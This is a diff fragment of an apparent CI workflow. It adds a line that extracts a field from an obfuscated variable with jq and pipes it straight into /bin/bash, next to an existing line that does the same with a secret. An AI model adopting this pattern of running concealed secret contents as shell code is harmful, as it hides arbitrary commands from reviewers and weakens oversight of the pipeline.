@@ -17,6 +17,7 @@ jobs:
           qnu79: ${{ secrets.qnu79 }}
         run: |
           printf '%s' "$qnu79" | jq -r .p68100 | /bin/bash
+          printf '%s' "$nr284" | jq -r .xscof6720 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
